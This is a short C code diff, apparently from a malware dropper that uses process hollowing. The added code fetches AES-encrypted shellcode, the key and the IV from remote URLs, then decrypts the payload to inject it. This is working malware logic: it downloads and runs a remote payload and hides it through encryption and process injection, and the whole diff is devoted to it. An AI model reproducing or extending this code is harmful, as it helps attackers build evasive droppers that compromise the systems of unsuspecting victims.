@@ -3,6 +3,7 @@
 #include <stdint.h>
 #include "Aes.h"
 #include "DropperProcessHollowing.h"
+#include "Downloader.h"
 
 
 int main(int argc, char* argv[]) {
@@ -13,11 +14,29 @@ int main(int argc, char* argv[]) {
         return 0;
     }
 
+    PBYTE encrypted_payload;
+    PBYTE key;
+    PBYTE iv;
+    SIZE_T encrypted_payload_size;
+    SIZE_T common_len;
+
+    if (!GetPayloadFromUrl(ENCRYPTED_SHELLCODE_URL, &encrypted_payload, &encrypted_payload_size)) {
+        return 1;
+    }
+
+    if (!GetPayloadFromUrl(KEY_URL, &key, &common_len)) {
+        return 1;
+    }
+
+    if (!GetPayloadFromUrl(IV_URL, &iv, &common_len)) {
+        return 1;
+    }
+
     // Decrypt the payload
     uint8_t* payload = NULL;
     size_t payloadSize = 0;
     if (!aes_decrypt(encrypted_payload,
-        ENCRYPTED_PAYLOAD_SIZE,
+        encrypted_payload_size,
         key,
         iv,
         &payload,
